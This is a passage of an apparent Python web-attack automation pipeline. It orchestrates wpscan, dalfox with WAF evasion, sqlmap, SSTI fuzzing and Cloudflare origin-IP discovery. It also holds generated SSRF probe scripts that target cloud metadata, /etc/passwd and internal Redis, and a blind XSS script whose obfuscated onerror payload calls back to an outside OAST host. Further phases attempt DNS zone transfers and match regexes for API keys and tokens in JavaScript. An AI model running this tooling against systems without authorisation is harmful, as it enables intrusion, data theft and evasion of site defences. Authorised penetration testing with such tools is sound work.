        '                    "cn": cn, "san": san,\n'
        '                })\n'
        '    except Exception as e:\n'
        '        results.append({"host": h, "error": str(e)})\n'
        f'with open({json.dumps(str(outdir / "tls_check.json"))}, "w") as f:\n'
        '    json.dump(results, f, indent=2)\n'
    )
    tls_script.chmod(0o755)
    testssl_jobs.append(("tls-check", ["python3", str(tls_script)], 300))
    # wpscan writes per-host files natively via --output.
    # Skip if the host doesn't appear to be WordPress (check multiple indicators).
    _f2_urlopen = _get_urlopener()
    wpscan_jobs: List[Tuple[str, List[str], int]] = []
    if t.has("wpscan"):
        for h in sample:
            if not h.startswith(("http://", "https://")):
                continue
            # Quick pre-check: is this WordPress? Check multiple paths + homepage body
            # to reduce false negatives from hardened / hidden wp-login.php.
            wp_found = False
            for wp_path in ("/wp-login.php", "/wp-content/", "/wp-includes/"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + wp_path, method="HEAD")
                    with _f2_urlopen(req, timeout=10) as resp:
                        if resp.status in (200, 301, 302, 403, 401):
                            wp_found = True
                            break
                except Exception:
                    continue
            if not wp_found:
                # Check homepage body for WordPress markers
                try:
                    req = urllib.request.Request(h, method="GET", headers={"User-Agent": "Mozilla/5.0"})
                    with _f2_urlopen(req, timeout=10) as resp:
                        body = resp.read().decode("utf-8", errors="ignore").lower()
                        if "wp-content" in body or "wordpress" in body:
                            wp_found = True
                except Exception:
                    pass
            if not wp_found:
                log("warn", f"10-TLSCMS: {h} does not appear to be WordPress, skipping wpscan")
                continue
            wps_out = outdir / f"wpscan_{safe_suffix(h)}.txt"
            wpscan_cmd = ["wpscan", "--url", h, "--no-banner",
                           "--enumerate", "vp,vt,tt,cb,dbe,u,ap,at",
                           "--output", str(wps_out)]
            _wps_cookie = os.environ.get("COOKIE", "")
            if _wps_cookie:
                wpscan_cmd.extend(["--cookie", _wps_cookie])
            _wps_headers = os.environ.get("EXTRA_HEADERS", "")
            if _wps_headers:
                for hdr in _wps_headers.split("\n"):
                    hdr = hdr.strip()
                    if hdr:
                        wpscan_cmd.extend(["--header", hdr])
            wpscan_token = os.environ.get("WPSCAN_API_TOKEN", "")
            if wpscan_token:
                wpscan_cmd.extend(["--api-token", wpscan_token])
            wpscan_jobs.append(
                (
                    f"wpscan-{_safe_name(h)}",
                    wpscan_cmd,
                    1800,
                )
            )
    # run both groups in parallel; per-host files remove the race
    await run_parallel(testssl_jobs + wpscan_jobs, outdir)
    n = merge_unique(
        list(outdir.glob("testssl_*.txt")) + list(outdir.glob("wpscan_*.txt")),
        outdir / "tls_wp.txt",
    )
    for p in outdir.glob("testssl_*.txt"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("wpscan_*.txt"):
        p.unlink(missing_ok=True)
    return {"10-TLSCMS": str(outdir / "tls_wp.txt"), "count": n}


async def phase_11_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11-INJECT"}:
        return {}
    _g_out = outdir / "vulns.txt"
    if _g_out.exists() and not force:
        return {"11-INJECT": str(_g_out), "count": count_nonblank(_g_out)}
    log("info", "Phase 11-INJECT: dalfox → sqlmap → SSRF probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "11-INJECT: no URLs; skipping")
        return {"11-INJECT": str(outdir / "vulns.txt"), "count": 0}
    # Dedupe by (host, path, sorted param keys) — keep URLs with different param names
    _g_seen: Set[Tuple[str, str, str, str]] = set()
    _g_deduped: List[str] = []
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        qs = frozenset(urllib.parse.parse_qs(parsed.query))
        key = (parsed.scheme, parsed.hostname or "", parsed.path.rstrip("/"), str(sorted(qs)))
        if key not in _g_seen:
            _g_seen.add(key)
            _g_deduped.append(u)
    all_urls = _g_deduped
    if oast_domain:
        os.environ["COLLABORATOR"] = oast_domain
    jobs: List[Tuple[str, List[str], int]] = []
    xss_urls = [u for u in all_urls if "=" in u]
    xss_in = ensure(outdir / "urls_xss.txt")
    if xss_urls:
        xss_in.write_text("\n".join(xss_urls) + "\n")
    if xss_urls and t.has("dalfox"):
        # kxss pre-filter: reduce noise by only keeping URLs where the param
        # value is reflected in the response body.
        kxss_out = outdir / "urls_xss_reflected.txt"
        if t.has("kxss"):
            jobs.append((
                "kxss",
                ["kxss", "-l", str(xss_in), "-o", str(kxss_out)],
                600,
            ))
        dalfox_in = kxss_out if t.has("kxss") else xss_in
        dalfox_cmd = [
            "dalfox", "file", str(dalfox_in), "-S",
            "--output", str(outdir / "xss.txt"),
            "--delay", "2s",
            "--user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "--only-custompayload",
            "--waf-evasion",
        ]
        proxy = os.environ.get("PROXY", "")
        if proxy:
            dalfox_cmd.extend(["--proxy", proxy])
        _dlf_cookie = os.environ.get("COOKIE", "")
        if _dlf_cookie:
            dalfox_cmd.extend(["--cookie", _dlf_cookie])
        _dlf_headers = os.environ.get("EXTRA_HEADERS", "")
        if _dlf_headers:
            for hdr in _dlf_headers.split("\n"):
                hdr = hdr.strip()
                if hdr:
                    dalfox_cmd.extend(["--header", hdr])
        jobs.append(("dalfox", dalfox_cmd, 3600))
    if t.has("sqlmap") and xss_urls:
        sqlmap_dir = outdir / "sqlmap"
        runner = outdir / "logs" / "sqlmap_runner.sh"
        ensure(runner)
        _sql_cookie = os.environ.get("COOKIE", "")
        _sql_headers = os.environ.get("EXTRA_HEADERS", "")
        _sql_extra = ""
        if _sql_cookie:
            _sql_extra += " --cookie=" + shlex.quote(_sql_cookie)
        if _sql_headers:
            _sql_extra += " --headers=" + shlex.quote(_sql_headers)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'sqlmap.log'))}\n"
            f"IN={shlex.quote(str(xss_in))}\n"
            f"DIR={shlex.quote(str(sqlmap_dir))}\n"
            'mkdir -p "$DIR"\n'
            f'sqlmap -m "$IN" --batch --level={_PIPELINE_CFG.sqlmap_level} --risk={_PIPELINE_CFG.sqlmap_risk} --random-agent '
            f'--delay={max(_PIPELINE_CFG.delay, 2)} --time-sec=10 '
            f'{_sql_extra}'
            f' --output-dir="$DIR" > "$OUT" 2>&1 || true\n'
        )
        runner.chmod(0o755)
        jobs.append(("sqlmap", ["bash", str(runner)], 7200))
    ssrf_urls = [
        u
        for u in all_urls
        if any(k in u.lower() for k in (
            "url=", "uri=", "path=", "dest=", "redirect=", "img=",
            "target=", "site=", "view=", "domain=", "feed=", "host=",
            "to=", "out=", "callback=", "load=", "fetch=", "proxy=",
            "image=", "img_url=", "picture=", "return=", "returnurl=",
            "next=", "continue=", "goto=", "forward=", "port=",
            "endpoint=", "svc=", "api=",
        ))
    ]
    ssrf_in = ensure(outdir / "urls_ssrf.txt")
    if ssrf_urls:
        ssrf_in.write_text("\n".join(ssrf_urls) + "\n")
    # Validate OAST hostname is a single safe token (alnum, dot, dash only)
    # BEFORE splicing it into a script. shlex.quote is belt-and-suspenders.
    if oast_domain and ssrf_urls and _SAFE_HOST.match(oast_domain):
        ssrf_script = outdir / "ssrf_probe.py"
        ssrf_script.write_text(
            "#!/usr/bin/env python3\n"
            '"""SSRF probe: rewrite URL parameters to point at OAST listener and internal targets."""\n'
            "import os, random, sys, urllib.request, urllib.parse\n"
            "# Proxy support: route through PROXY env var if set\n"
            "_proxy = os.environ.get('PROXY', '')\n"
            "if _proxy:\n"
            "    _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
            "    _urlopen = urllib.request.build_opener(_handler).open\n"
            "else:\n"
            "    _urlopen = urllib.request.urlopen\n"
            f"OAST = {json.dumps(oast_domain)}\n"
            f"IN = {json.dumps(str(ssrf_in))}\n"
            "SSRF_PARAMS = {\n"
            "    'url', 'uri', 'path', 'dest', 'redirect', 'img', 'target', 'site',\n"
            "    'view', 'domain', 'feed', 'host', 'to', 'out', 'callback', 'load',\n"
            "    'fetch', 'proxy', 'image', 'img_url', 'picture', 'return', 'returnurl',\n"
            "    'next', 'continue', 'goto', 'forward', 'port', 'endpoint', 'svc', 'api',\n"
            "}\n"
            "INTERNAL_TARGETS = [\n"
            "    f'http://{OAST}/ssrf-{{i}}',\n"
            "    'http://169.254.169.254/latest/meta-data/',\n"
            "    'http://[::1]/',\n"
            "    'http://127.0.0.1:8080/',\n"
            "    'http://127.0.0.1:80/',\n"
            "    'http://0.0.0.0:80/',\n"
            "    'http://localhost:80/',\n"
            "    'file:///etc/passwd',\n"
            "    'gopher://127.0.0.1:6379/_',\n"
            "    'dict://127.0.0.1:6379/info',\n"
            "]\n"
            "import uuid\n"
            "with open(IN) as f:\n"
            "    for line in f:\n"
            "        url = line.strip()\n"
            "        if not url:\n"
            "            continue\n"
            "        # Fire a direct HTTP probe to OAST as a ping (independent of param injection)\n"
            "        try:\n"
            "            ping_url = f'http://{OAST}/ssrf-ping/' + uuid.uuid4().hex[:12]\n"
            "            _urlopen(urllib.request.Request(ping_url, method='GET',\n"
            "                headers={'User-Agent': 'Mozilla/5.0'}), timeout=10)\n"
            "        except Exception:\n"
            "            pass\n"
            "        parsed = urllib.parse.urlparse(url)\n"
            "        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)\n"
            "        for param in SSRF_PARAMS:\n"
            "            if param in qs:\n"
            "                for target in INTERNAL_TARGETS:\n"
            "                    test_qs = qs.copy()\n"
            "                    test_qs[param] = [target.format(i=random.randint(0, 99999))]\n"
            "                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)\n"
            "                    new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))\n"
            "                    try:\n"
            "                        req = urllib.request.Request(new_url, method='GET',\n"
            "                            headers={'User-Agent': 'Mozilla/5.0'})\n"
            "                        _urlopen(req, timeout=10)\n"
            "                    except Exception:\n"
            "                        pass\n"
        )
        ssrf_script.chmod(0o755)
        jobs.append(("ssrf-probe", ["python3", str(ssrf_script)], 600))
        # Blind XSS — inject a header that will callback to OAST when rendered server-side
        blind_xss_in = ensure(outdir / "urls_xss_blind.txt")
        blind_xss_urls = xss_urls[:_PIPELINE_CFG.sample_urls_xss_blind]
        if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
            blind_xss_in.write_text("\n".join(blind_xss_urls) + "\n")
            blind_script = outdir / "blind_xss_probe.py"
            blind_script.write_text(
                "#!/usr/bin/env python3\n"
                '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
                "import os, sys, urllib.request\n"
                "# Proxy support: route through PROXY env var if set\n"
                "_proxy = os.environ.get('PROXY', '')\n"
                "if _proxy:\n"
                "    _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
                "    _urlopen = urllib.request.build_opener(_handler).open\n"
                "else:\n"
                "    _urlopen = urllib.request.urlopen\n"
                f"OAST = {json.dumps(oast_domain)}\n"
                f"IN = {json.dumps(str(blind_xss_in))}\n"
                'PAYLOAD = f\'"><img src=x onerror=eval(atob("ZmV0Y2goImh0dHA6Ly97b2FzdH0vYmxpbmQ9eHNzIik=".replace("{oast}",OAST)))>\'\n'
                "PAYLOAD2 = f'\\'-prompt`{OAST}`-\\''\n"
                "with open(IN) as f:\n"
                "    for line in f:\n"
                "        url = line.strip()\n"
                "        if not url or '=' not in url:\n"
                "            continue\n"
                "        try:\n"
                "            req = urllib.request.Request(url, method='GET',\n"
                "                headers={'User-Agent': PAYLOAD,\n"
                "                        'Referer': PAYLOAD2,\n"
                "                        'X-Forwarded-For': PAYLOAD})\n"
                "            _urlopen(req, timeout=10)\n"
                "        except Exception:\n"
                "            pass\n"
            )
            blind_script.chmod(0o755)
            jobs.append(("blind-xss-probe", ["python3", str(blind_script)], 300))
    elif oast_domain and ssrf_urls:
        log("warn", "11-INJECT: interactsh domain has unsafe characters, skipping SSRF probes")
    await run_parallel(jobs, outdir)
    # Extract actual SQLi findings from sqlmap output instead of dumping raw log
    sqlmap_findings: List[str] = []
    sqlmap_log = outdir / "sqlmap.log"
    if sqlmap_log.exists():
        for ln in read_lines(sqlmap_log):
            lower = ln.lower()
            if any(kw in lower for kw in ("sql injection", "parameter", "payload:", "type: ", "title:")):
                sqlmap_findings.append(ln)
    if sqlmap_findings:
        ensure(outdir / "sqlmap_findings.txt").write_text("\n".join(sqlmap_findings) + "\n")
    parts = [outdir / "xss.txt", outdir / "sqlmap_findings.txt"]
    n = merge_unique(parts, outdir / "vulns.txt")
    return {"11-INJECT": str(outdir / "vulns.txt"), "count": n}


async def phase_12_SSTI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"12-SSTI"}:
        return {}
    _g2_out = outdir / "ssti.txt"
    if _g2_out.exists() and not force:
        return {"12-SSTI": str(_g2_out), "count": count_nonblank(_g2_out)}
    log("info", "Phase 12-SSTI: SSTI + deep XSS/SQLi fuzzing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "12-SSTI: no URLs; skipping")
        return {"12-SSTI": str(outdir / "ssti.txt"), "count": 0}
    # Deduplicate by (host, path, sorted param keys) so different parameter
    # names on the same path are all tested, not collapsed into one.
    seen_keys: Set[Tuple[str, str, str, str]] = set()
    deduped: List[str] = []
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        qs = frozenset(urllib.parse.parse_qs(parsed.query))
        key = (parsed.scheme, parsed.hostname or "", parsed.path.rstrip("/"), str(sorted(qs)))
        if key not in seen_keys:
            seen_keys.add(key)
            deduped.append(u)
    all_urls = deduped
    param_urls = [u for u in all_urls if "=" in u]
    if not param_urls:
        param_urls = all_urls[:_PIPELINE_CFG.sample_urls_ssti]

    eval_map = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "*{7*7}": "49",
        "{{7*'7'}}": "7777777",
        "<%= 7*7 %>": "49",
        "${{7*7}}": "49",
    }

    ssti_findings: List[str] = []
    seen_ssti: Set[str] = set()
    _ssti_extra_headers = _extra_headers_dict()
    _ssti_urlopen = _get_urlopener()

    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            for payload, expected in eval_map.items():
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                if test_url in seen_ssti:
                    continue
                seen_ssti.add(test_url)
                await _throttle()
                try:
                    _ssti_req_hdr = {"User-Agent": "Mozilla/5.0"}
                    _ssti_req_hdr.update(_ssti_extra_headers)
                    req = urllib.request.Request(
                        test_url,
                        headers=_ssti_req_hdr,
                    )
                    with _ssti_urlopen(req, timeout=15) as resp:
                        body = resp.read().decode("utf-8", errors="ignore")
                    if expected in body:
                        ssti_findings.append(
                            f"[SSTI-evaluated] {test_url} param={param_name} payload={payload} → {expected}"
                        )
                    elif payload in body:
                        ssti_findings.append(
                            f"[SSTI-reflected-only] {test_url} param={param_name} payload={payload}"
                        )
                except Exception:
                    continue

    ensure(outdir / "ssti.txt").write_text(
        "\n".join(ssti_findings) + ("\n" if ssti_findings else "")
    )
    log("ok", f"12-SSTI: {len(ssti_findings)} SSTI reflections detected")
    return {"12-SSTI": str(outdir / "ssti.txt"), "count": len(ssti_findings)}


# ─────────────────────────── manual-testing phases ──────────────────────────
# Phases 14-ORIGIN–L address gaps that automated scanners often miss but can be
# partially automated with targeted scripts and API calls.
# ───────────────────── Phase 14-ORIGIN: origin IP bypass ────────────────────────────
def _mmh3_hash(data: bytes) -> int:
    """Python implementation of mmh3 hash (used by Shodan favicon lookup)."""
    seed = 0
    c1 = 0xCC9E2D51
    c2 = 0x1B873593
    r1 = 15
    r2 = 13
    m = 5
    n = 0xE6546B64
    h = seed
    length = len(data)
    nblocks = length // 4
    for i in range(nblocks):
        k = struct.unpack_from("<I", data, i * 4)[0]
        k = (k * c1) & 0xFFFFFFFF
        k = ((k << r1) | (k >> (32 - r1))) & 0xFFFFFFFF
        k = (k * c2) & 0xFFFFFFFF
        h ^= k
        h = ((h << r2) | (h >> (32 - r2))) & 0xFFFFFFFF
        h = (h * m + n) & 0xFFFFFFFF
    tail = data[nblocks * 4 :]
    k = 0
    tail_len = length & 3
    if tail_len == 3:
        k ^= tail[2] << 16
    if tail_len >= 2:
        k ^= tail[1] << 8
    if tail_len >= 1:
        k ^= tail[0]
        k = (k * c1) & 0xFFFFFFFF
        k = ((k << r1) | (k >> (32 - r1))) & 0xFFFFFFFF
        k = (k * c2) & 0xFFFFFFFF
        h ^= k
    h ^= length
    h ^= h >> 16
    h = (h * 0x85EBCA6B) & 0xFFFFFFFF
    h ^= h >> 13
    h = (h * 0xC2B2AE35) & 0xFFFFFFFF
    h ^= h >> 16
    return h


async def phase_13_OOB(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast: Interactsh, force: bool = False) -> Dict[str, Any]:
    if skip & {"13-OOB"}:
        return {}
    _h_out = outdir / "oast" / "callbacks.txt"
    if _h_out.exists() and not force:
        return {"13-OOB": str(_h_out), "count": count_nonblank(_h_out)}
    log("info", "Phase 13-OOB: OAST callback collection")
    out = oast.stop()
    n = count_nonblank(out)
    if n:
        log("ok", f"13-OOB: {n} OOB callback(s) captured")
    else:
        log("info", "13-OOB: no OOB callbacks captured")
    return {"13-OOB": str(out), "count": n}


async def phase_14_ORIGIN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"14-ORIGIN"}:
        return {}
    _j_out = outdir / "origin.txt"
    if _j_out.exists() and not force:
        return {"14-ORIGIN": str(_j_out), "count": count_nonblank(_j_out)}
    log("info", "Phase 14-ORIGIN: origin IP bypass enumeration")
    findings: List[str] = []
    _j_extra_headers = _extra_headers_dict()
    _j_urlopen = _get_urlopener()
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists():
        hosts_file = outdir / "resolved.txt"
    have_hosts = hosts_file.exists() and bool(read_lines(hosts_file))
    # 1. Favicon hash
    favicon_urls = []
    if have_hosts:
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_origin]:
            base = h if h.startswith("http") else f"https://{h}"
            favicon_urls.append(base.rstrip("/") + "/favicon.ico")
    if not favicon_urls:
        favicon_urls = [f"https://{domain}/favicon.ico"]
    for url in favicon_urls:
        try:
            _j_fav_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_fav_hdr.update(_j_extra_headers)
            req = urllib.request.Request(url, headers=_j_fav_hdr, method="GET")
            with _j_urlopen(req, timeout=10) as resp:
                data = resp.read()
            if data:
                h = _mmh3_hash(data) & 0xFFFFFFFF
                findings.append(f"favicon_hash={h} (url={url})")
                findings.append(
                    f"  Shodan: https://www.shodan.io/search?query=http.favicon.hash:{h}"
                )
                findings.append(
                    f"  Shodan (org): https://www.shodan.io/search?query=org:%22Cloudflare%22+http.favicon.hash:{h}"
                )
                break
        except Exception:
            continue
    # 2. crt.sh certificate history
    crt_urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://crt.sh/?q=%25.{domain}&output=json",
    ]
    crt_found_any = False
    for crt_url in crt_urls:
        if crt_found_any:
            break
        try:
            _j_crt_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_crt_hdr.update(_j_extra_headers)
            req = urllib.request.Request(crt_url, headers=_j_crt_hdr)
            with _j_urlopen(req, timeout=15) as resp:
                raw = resp.read().decode("utf-8", errors="ignore")
            certs = json.loads(raw)
            if not isinstance(certs, list) or not certs:
                continue
            ips: Set[str] = set()
            subdomains: Set[str] = set()
            for c in certs if isinstance(certs, list) else []:
                if isinstance(c, dict):
                    nv = c.get("name_value", "")
                    for name in nv.split("\n"):
                        name = name.strip().lower()
                        if name and _is_valid_hostname(name):
                            subdomains.add(name)
            # Try to resolve a few subdomains to find non-CF IPs
            resolved = [s for s in subdomains if s != domain][:_PIPELINE_CFG.sample_hosts_origin]
            if t.has("dnsx") and resolved:
                crt_subs = outdir / "crt_subs.txt"
                ensure(crt_subs).write_text("\n".join(resolved) + "\n")
                crt_resolved = outdir / "crt_resolved.txt"
                await _run(
                    "dnsx-crt",
                    [
                        "dnsx",
                        "-silent",
                        "-l",
                        str(crt_subs),
                        "-o",
                        str(crt_resolved),
                        "-a",
                        "-resp",
                    ],
                    300,
                    outdir,
                )
                if crt_resolved.exists():
                    for ln in read_lines(crt_resolved):
                        parts = ln.split()
                        if len(parts) >= 3:
                            ip = parts[-1].strip("[]")
                            if ip and ip.count(".") == 3:
                                ips.add(ip)
            if ips:
                findings.append(f"crt.sh: {len(subdomains)} subdomains, {len(ips)} unique IPs")
                for ip in list(ips)[:10]:
                    findings.append(f"  origin_candidate={ip}")
            crt_found_any = True
        except Exception:
            continue
    # 3. MX records (often not proxied by Cloudflare)
    # Use public DNS resolver to avoid local stub resolver issues over proxychains
    mx_file = outdir / "mx_records.txt"
    _DNS_RESOLVER = "@8.8.8.8"
    if t.has("dig"):
        proc = await asyncio.create_subprocess_exec(
            "dig",
            "+short",
            _DNS_RESOLVER,
            "mx",
            domain,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        except asyncio.TimeoutError:
            proc.kill()
            stdout = b""
        mx = stdout.decode("utf-8", errors="ignore").strip()
        if mx and not mx.startswith(";"):
            ensure(mx_file).write_text(mx + "\n")
            for ln in mx.splitlines():
                ln = ln.strip()
                if ln:
                    findings.append(f"mx_record={ln}")
                    # Try resolving the MX target
                    mx_host = (ln.split()[-1] if len(ln.split()) > 1 else ln).rstrip(".")
                    if t.has("dig"):
                        try:
                            proc2 = await asyncio.create_subprocess_exec(
                                "dig",
                                "+short",
                                _DNS_RESOLVER,
                                mx_host.rstrip("."),
                                stdin=asyncio.subprocess.DEVNULL,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.DEVNULL,
                            )
                            out2, _ = await asyncio.wait_for(proc2.communicate(), timeout=10)
                        except asyncio.TimeoutError:
                            proc2.kill()
                            out2 = b""
                        for mip in out2.decode().splitlines():
                            mip = mip.strip()
                            if mip and mip.count(".") == 3:
                                findings.append(f"  mx_ip={mip} (non-CF origin candidate)")
    # 3b. DNS zone transfer attempt (AXFR) — low success rate but high impact
    if t.has("dig"):
        try:
            ns_proc = await asyncio.create_subprocess_exec(
                "dig", "+short", _DNS_RESOLVER, "ns", domain,
                stdin=asyncio.subprocess.DEVNULL,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            ns_out, _ = await asyncio.wait_for(ns_proc.communicate(), timeout=10)
            for ns_line in ns_out.decode(errors="ignore").splitlines():
                ns = ns_line.strip().rstrip(".")
                if not ns or not _is_valid_hostname(ns):
                    continue
                try:
                    axfr_proc = await asyncio.create_subprocess_exec(
                        "dig", "axfr", f"@{ns}", domain,
                        stdin=asyncio.subprocess.DEVNULL,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL,
                    )
                    axfr_out, _ = await asyncio.wait_for(axfr_proc.communicate(), timeout=15)
                    axfr_text = axfr_out.decode(errors="ignore")
                    if "Transfer failed" not in axfr_text and len(axfr_text) > 100:
                        findings.append(f"  axfr_success=YES (ns={ns}) — zone data follows")
                        for axfr_ln in axfr_text.splitlines()[:20]:
                            findings.append(f"    {axfr_ln[:120]}")
                except Exception:
                    continue
        except Exception:
            pass
    # 3c. SPF / DMARC / DKIM DNS record checks
    if t.has("dig"):
        for rec, label in (("txt", "SPF"), ("dmarc", "DMARC"), ("dkim", "DKIM")):
            query = f"_dmarc.{domain}" if rec == "dmarc" else (
                f"default._domainkey.{domain}" if rec == "dkim" else domain)
            try:
                sp_proc = await asyncio.create_subprocess_exec(
                    "dig", "+short", _DNS_RESOLVER, rec, query,
                    stdin=asyncio.subprocess.DEVNULL,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                sp_out, _ = await asyncio.wait_for(sp_proc.communicate(), timeout=10)
                sp_text = sp_out.decode(errors="ignore")
                if sp_text.strip():
                    findings.append(f"  {label}_records:")
                    for sp_ln in sp_text.splitlines()[:5]:
                        findings.append(f"    {sp_ln[:200]}")
                    if "v=spf1" in sp_text.lower() and "~all" in sp_text.lower():
                        findings.append(f"    → {label}: softfail (~all) — may be spoofable")
                    elif "v=spf1" in sp_text.lower() and "?all" in sp_text.lower():
                        findings.append(f"    → {label}: neutral (?all) — no enforcement")
                    elif "v=spf1" in sp_text.lower() and "-all" not in sp_text.lower():
                        findings.append(f"    → {label}: no hardfail — consider -all")
            except Exception:
                continue
    # 4. Check resolved IPs against Cloudflare ASN (with local caching)
    resolved_path = Path(prev.get("02-RESOLVE") or outdir / "resolved_full.txt")
    ipcache = outdir / ".ipinfo_cache.json"
    ipcache_data: Dict[str, dict] = {}
    if ipcache.exists():
        try:
            ipcache_data = json.loads(ipcache.read_text(errors="ignore"))
        except (json.JSONDecodeError, ValueError):
            ipcache_data = {}
    if resolved_path.exists():
        resolved_ips: Set[str] = set()
        for ln in read_lines(resolved_path):
            parts = ln.split()
            if len(parts) >= 3 and parts[-2].strip("[]") == "A":
                # Only A-record lines: host [A] [1.2.3.4]
                ip = parts[-1].strip("[]")
                if ip and ip.count(".") == 3:
                    resolved_ips.add(ip)
        if resolved_ips:
            cf_ips: Set[str] = set()
            non_cf_ips: Set[str] = set()
            for ip in sorted(resolved_ips)[:_PIPELINE_CFG.sample_hosts_origin]:
                if ip in ipcache_data:
                    info_data = ipcache_data[ip]
                else:
                    try:
                        _j_ip_hdr = {"User-Agent": "Mozilla/5.0"}
                        _j_ip_hdr.update(_j_extra_headers)
                        req = urllib.request.Request(
                            f"https://ipinfo.io/{ip}/json", headers=_j_ip_hdr
                        )
                        with _j_urlopen(req, timeout=10) as resp:
                            info = resp.read().decode("utf-8", errors="ignore")
                        info_data = json.loads(info)
                        ipcache_data[ip] = info_data
                    except Exception:
                        findings.append(
                            f"  unresolved_ip={ip} (check manually)"
                        )
                        continue
                org = (info_data.get("org") or "").lower()
                if "cloudflare" in org or "13335" in org:
                    cf_ips.add(ip)
                else:
                    non_cf_ips.add(ip)
                    findings.append(
                        f"  non_cloudflare_ip={ip}  org={info_data.get('org', 'unknown')}"
                    )
            if ipcache_data:
                ipcache.write_text(json.dumps(ipcache_data, indent=2))
            if cf_ips:
                findings.append(f"  cloudflare_ips={', '.join(sorted(cf_ips))}")
            if non_cf_ips:
                findings.append(f"  non_cloudflare_candidates={', '.join(sorted(non_cf_ips))}")
    out = ensure(outdir / "origin.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"14-ORIGIN: {len(findings)} origin findings → {out}")
    return {"14-ORIGIN": str(out), "count": len(findings)}


# ──────────────────── Phase 15-SECRETS: deep JS secret scanning ──────────────────────
_JS_SECRET_PATTERNS: List[Tuple[str, str]] = [
    ("firebase", r"AIza[0-9A-Za-z\-_]{35}"),
    ("stripe-live", r"(?:sk|pk)_live_[0-9A-Za-z]{24,}"),
    ("stripe-test", r"(?:sk|pk)_test_[0-9A-Za-z]{24,}"),
    ("github-tok", r"gh[opsu]_[0-9A-Za-z]{36,}"),
    ("aws-key", r"AKIA[0-9A-Z]{16}"),
    ("aws-secret", r"(?i)aws(.{0,20})?(?:secret|key).{0,20}[\"'][0-9a-zA-Z\/+=]{40}[\"']"),
    ("google-oauth", r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com"),
    ("slack-tok", r"xox[baprs]-[0-9A-Za-z\-]{10,}"),
    ("jwt", r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}"),
    ("heroku", r"https://api\.heroku\.com"),
    ("graphql", r"(graphql|gql)\s*[=:]\s*[\"']https?://"),
    ("s3-bucket", r"(?:bucket|asset|media|uploads|backup|files|cdn|static)\.(?:s3\.amazonaws\.com|s3-[a-z0-9-]+\.amazonaws\.com)"),
    ("process-env", r"process\.env\.(?:SECRET|TOKEN|KEY|PASSWORD|API_KEY|ACCESS_KEY|SECRET_KEY)"),
    ("json-secret-key", r"""(?i)(?:api[_-]?key|secret|token|password|passwd)\s*[:=]\s*["'`][A-Za-z0-9_\-/=+]{16,}["'`]"""),
    (
        "internal-ip",
        r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})",
    ),
    (
        "internal-host",
        r"(?i)(?:internal|private|staging|dev|jenkins|gitlab|jira|confluence)\.(?:com|local|internal|corp)",
    ),
]
_SOURCE_MAP_RE = re.compile(r'(?://#\s*sourceMappingURL=|sourceMappingURL=)([^\s"\']+)')


async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"15-SECRETS"}:
        return {}
    _k_out = outdir / "js_secrets_deep.txt"
    if _k_out.exists() and not force:
        return {"15-SECRETS": str(_k_out), "count": count_nonblank(_k_out)}
    log("info", "Phase 15-SECRETS: deep JS secret scanning (custom regex + entropy + source maps)")
    _k_extra_headers = _extra_headers_dict()
    _k_urlopen = _get_urlopener()
